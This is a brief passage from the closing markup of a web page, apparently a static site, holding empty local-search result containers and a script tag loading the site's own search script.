id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>